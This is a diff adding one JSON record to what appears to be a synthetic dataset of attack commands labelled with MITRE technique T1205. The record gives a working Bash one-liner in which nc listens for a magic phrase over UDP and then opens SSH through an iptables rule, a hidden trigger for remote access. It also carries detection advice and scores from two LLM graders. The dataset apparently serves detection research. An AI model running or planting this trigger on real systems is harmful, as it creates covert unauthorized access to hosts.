@@ -1,0 +1,48 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo bash -c 'nc -lukp 4000 | grep -m1 -x \"MAGIC_OPEN_SSH\" && iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT'",
+  "explanation": "Listens on UDP/4000 for an exact magic phrase; upon detection, immediately opens SSH by inserting an iptables ACCEPT rule. Requires root (sudo). Detection: monitor for unauthorized listeners on odd ports and sudden iptables rule insertions.",
+  "rationale_steps": [
+    "Uses nc in listen mode to wait for a specific trigger payload.",
+    "Minimal parsing via grep to avoid obfuscation.",
+    "On match, modifies firewall to enable hidden functionality (SSH access).",
+    "Detect via process monitoring for nc listeners and firewall change auditing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-753dbc1f-87c01879",
+  "source_prompt_hash": "753dbc1f",
+  "timestamp_utc": "2025-09-30T05:37:53.725688Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Properly quoted sudo bash -c string with valid pipes, control operators, and commonly valid nc/iptables flags.",
+        "semantic_score": 4,
+        "semantic_justification": "It listens on UDP/4000 for a magic token and upon match inserts an iptables rule to allow SSH, aligning with T1205 traffic signaling, though exact behavior can vary by nc variant and input newline handling.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T18:14:23.024320Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, including balanced quotes, valid flags (e.g., '-p' for local/listening port depending on 'nc' implementation), and correct command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the T1205 Traffic Signaling technique, using a magic phrase over UDP to trigger a security-sensitive action (opening SSH via iptables), and is operationally plausible.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T18:15:02.725717Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.5,
+    "llm_average_score": 4.75,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
